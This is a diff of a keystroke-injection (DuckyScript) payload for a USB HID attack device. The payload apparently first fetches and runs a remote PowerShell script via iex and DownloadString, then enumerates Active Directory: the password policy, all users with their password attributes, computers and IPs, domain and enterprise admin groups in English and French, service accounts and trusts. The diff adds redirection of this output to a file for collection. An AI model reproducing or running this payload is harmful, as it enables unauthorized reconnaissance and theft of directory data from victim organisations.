@@ -15,51 +15,51 @@ STRING iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercont
 DELAY 500
 ENTER
 DELAY 10000
-STRING Get-ADDefaultDomainPasswordPolicy
+STRING Get-ADDefaultDomainPasswordPolicy > adoutput.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING Get-ADDomainController -Discover
+STRING Get-ADDomainController -Discover >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING Get-ADUser -Filter * -Properties * | Select SamAccountName,PasswordLastSet,PasswordNeverExpires,MemberOf,Description
-DELAY 500
-ENTER
-DELAY 3000
-STRING Get-ADComputer -Filter * | Select Name,LastLogonDate,IPv4Address
+STRING Get-ADUser -Filter * -Properties * | Select SamAccountName,PasswordLastSet,PasswordNeverExpires,MemberOf,Description >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 3000
-STRING Get-ADGroup -Filter * | Select Name
+STRING Get-ADComputer -Filter * | Select Name,LastLogonDate,IPv4Address >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 3000
-STRING Get-ADGroupMember -Identity Administrateurs
+STRING Get-ADGroup -Filter * | Select Name >> adoutput.txt
+DELAY 500
+ENTER
+DELAY 3000
+STRING Get-ADGroupMember -Identity Administrateurs >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING Get-ADGroupMember -Identity Administrators
+STRING Get-ADGroupMember -Identity Administrators >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING Get-ADGroupMember -Identity "Admins du domaine"
+STRING Get-ADGroupMember -Identity "Admins du domaine" >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING Get-ADGroupMember -Identity "Domain Admins"
+STRING Get-ADGroupMember -Identity "Domain Admins" >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING Get-ADForest
+STRING Get-ADForest >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING Get-ADServiceAccount -Filter *
+STRING Get-ADServiceAccount -Filter * >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING Get-ADTrust -Filter *
+STRING Get-ADTrust -Filter * >> adoutput.txt
 DELAY 500
 ENTER
 DELAY 1000
